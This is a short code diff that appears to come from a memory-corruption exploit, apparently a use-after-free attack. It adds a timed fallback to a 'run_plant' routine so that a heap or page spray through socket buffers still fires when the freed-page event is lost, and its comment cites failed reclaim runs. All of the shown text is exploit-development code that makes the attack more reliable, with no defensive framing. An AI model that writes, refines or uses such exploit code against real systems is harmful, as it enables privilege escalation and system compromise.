@@ -1,0 +1,28 @@
+diff --git a/src/timer/timer.c b/src/timer/timer.c
+index 4be9ba7..77b6ec8 100644
+--- a/src/timer/timer.c
++++ b/src/timer/timer.c
+@@ -2549,6 +2549,23 @@ static void run_plant(unsigned long long target, int tag, int mode,
+                 atomic_store(&g_burst2, 1);
+             }
+         }
++        /*
++         * v3 fallback: the victim page free happens at or before the zombie
++         * appears, so by the time this loop runs the event is either still
++         * in the ring or already overwritten.  If it was overwritten,
++         * free_seen would never fire and phase 2 would never release --
++         * a guaranteed reclaim loss (PD2405 run 4: free_seen=0, burst
++         * hit=0, 15 s).  Release phase 2 on a timer instead: if the free
++         * really has not happened yet, the spray budget simply soaks into
++         * socket buffers and the plant misses as before -- no worse.
++         */
++        if (!free_seen && now_ms() - t1 >= 150)
++        {
++            free_seen = 1;
++            atomic_store(&g_burst2, 1);
++            logf("[!] plant%d phase2 fallback release at %ldms "
++                 "(free event lost)\n", tag, now_ms() - t1);
++        }
+         if (!hit)
+             usleep(50);
+     }
